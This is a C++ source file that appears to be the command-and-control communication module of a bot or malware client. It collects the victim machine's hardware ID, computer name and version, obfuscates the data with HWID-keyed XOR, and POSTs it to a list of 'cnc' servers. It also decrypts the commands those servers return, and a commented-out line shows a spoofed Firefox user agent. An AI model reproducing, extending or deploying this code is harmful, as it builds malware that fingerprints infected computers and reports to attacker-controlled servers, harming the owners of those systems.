#include "PanelRequest.h"
#include "Base.h"

PanelRequest::PanelRequest()
{
	InitializeCriticalSection(&cs);
}

PanelRequest::~PanelRequest(void)
{
	DeleteCriticalSection(&cs);
}

void PanelRequest::setAction(std::string &action)
{
	this->action = action;
}

bool PanelRequest::execute(std::string &response)
{
	return(execute(&response));
}

bool PanelRequest::execute()
{
	return(execute(NULL));
}

bool PanelRequest::execute(std::string *response)
{
	std::string version, hwid, pcname, path;
	char *resp, *data;
	unsigned char outkey[18];
	unsigned int rlen, datalen = 0;

	Base *b = Base::instance();
	b->getSVersion(version);
	b->getCurrentPath(path);
	b->getHWID(hwid);
	b->getPCName(pcname);

	std::vector<std::pair<std::string, std::string>>::const_iterator it;
	EnterCriticalSection(&cs);

	for (it = params.begin(); it != params.end(); it++)
		datalen += it->first.length() + 2 + it->second.length() * 3;

	Authhdr *hdr = (Authhdr *)new char[sizeof(Authhdr) + datalen];
	hdr->version = b->getNVersion();
	strncpy(hdr->sversion, version.c_str(), sizeof(hdr->sversion));
	strncpy(hdr->hwid, hwid.c_str(), sizeof(hdr->hwid));
	hdr->nonce[0] = rand();
	hdr->nonce[1] = rand();
	strncpy(hdr->pcname, pcname.c_str(), sizeof(hdr->pcname));
	strncpy(hdr->action, action.c_str(), sizeof(hdr->action));
	hdr->size = datalen + 123;

	*(unsigned int *)hdr->sig = 0xab12de34;
	unsigned char *p;
	for (p = (unsigned char *)hdr; p < hdr->sig; p++)
		hdr->sig[*p % 4] += *p + (*p % 27);

	p = hdr->data;
	for (it = params.begin(); it != params.end(); it++) {
		strcpy((char *)p, it->first.c_str());
		p += it->first.length();
		*p++ = '=';
		p = (unsigned char *)urlencode((unsigned char *)it->second.c_str(), it->second.length(), (char *)p);
		*p++ = '&';
	}
	LeaveCriticalSection(&cs);

	memcpy(outkey, hdr->hwid, 18);
	unsigned char k = 0xaa;
	xorEncrypt(hdr, sizeof(Authhdr) + datalen, &k, 1);
	xorEncrypt(hdr->data, datalen, (unsigned char *)hdr->hwid, 18);

	data = (char *)hdr;
	datalen += sizeof(Authhdr);

	Settings *s = Settings::instance();
	s->lock();

	for (it = s->cnc.begin(); it != s->cnc.end(); it++) {
		char **pr = NULL;
		unsigned int *prlen = NULL;

		if (response) {
			pr = &resp;
			prlen = &rlen;
		}

		//if (httpRequest(it->first.c_str(), it->second.c_str(), 80, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0", data, datalen, pr, prlen) == s->successcode) 
		if (httpRequest(it->first.c_str(), it->second.c_str(), 80, version.c_str(), data, datalen, pr, prlen) == s->successcode) 
		{
			if (response && resp && rlen) 
			{
				xorEncrypt(resp, rlen, outkey, 18);
				response->assign(resp, rlen);
				delete[] resp;
			}
			s->unlock();
			return(true);
		}

		if (response && resp && rlen)
			delete[] resp;

		Sleep(1000);
	}
	delete[] hdr;

	s->unlock();
	return(false);
}

unsigned int PanelRequest::httpRequest(const char *host, const char *path, unsigned short port, const char *useragent, const char *postdata, unsigned int pdatalen, char **response, unsigned int *rlen)
{
	HINTERNET req, c, iO;
	unsigned int ret = 0;

	if (rlen)
		*rlen = 0;

	if (response)
		*response = NULL;

	iO = InternetOpen(useragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!iO || iO == INVALID_HANDLE_VALUE) {
		log(LL_ERROR, L_INTEROPEN L_FAIL);
		return(0);
	}

	c = InternetConnect(iO, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!c || c == INVALID_HANDLE_VALUE) {
		log(LL_ERROR, L_INTERCONN L_TO "http://%s:%d" L_FAIL, host, port);
		goto error1;
	}

	req = HttpOpenRequest(c, "POST", path, "HTTP/1.1", NULL, NULL, 0, 0);
	if (!req || req == INVALID_HANDLE_VALUE) {
		log(LL_ERROR, L_HTTPOREQ L_FAIL);
		goto error2;
	}

	if (!HttpSendRequest(req, HTTP_HEADER, sizeof(HTTP_HEADER) - 1, (void *)postdata, pdatalen)) {
		log(LL_ERROR, L_HTTPSREQ L_FAIL);
		goto out;
	}

	char sc[10] = { 0 };
	DWORD lsc = sizeof(sc);
	DWORD index = 0;
	if (!HttpQueryInfo(req, HTTP_QUERY_STATUS_CODE, sc, &lsc, &index)) {
		log(LL_ERROR, L_HTTPQINFO L_FAIL);
		goto out;
	}

	ret = atoi(sc);

	if (response && rlen) {
		DWORD read = 0, rd;
		char *buf = (char *)malloc(1024);
		bool success = false;

		while (InternetReadFile(req, buf + read, 1024, &rd)) {
			if (!rd) {
				success = true;
				break;
			}
			read += rd;

			buf = (char *)realloc(buf, read + 1024);
		}

		if (success) {
			*rlen = read;
			*response = buf;
		} else
			free(buf);
	}

out:
	InternetCloseHandle(req);
error2:
	InternetCloseHandle(c);
error1:
	InternetCloseHandle(iO);

	return(ret);
}

void PanelRequest::addParameter(std::string &name, std::string &val)
{
	EnterCriticalSection(&cs);
	params.push_back(std::pair<std::string, std::string>(name, val));
	LeaveCriticalSection(&cs);
}

__inline char *PanelRequest::urlencode(const unsigned char *data, unsigned int length, char *buf)
{
	char *p = buf;
	for (unsigned int i = 0; i < length; i++)
		p += sprintf(buf + 3*i, "%%%02x", data[i]);
	return(p);
}

void PanelRequest::xorEncrypt(void *data, unsigned int length, const unsigned char *key, unsigned int klen)
{
	for (unsigned int i = 0; i < length; i++)
		((unsigned char *)data)[i] ^= key[i % klen];
}
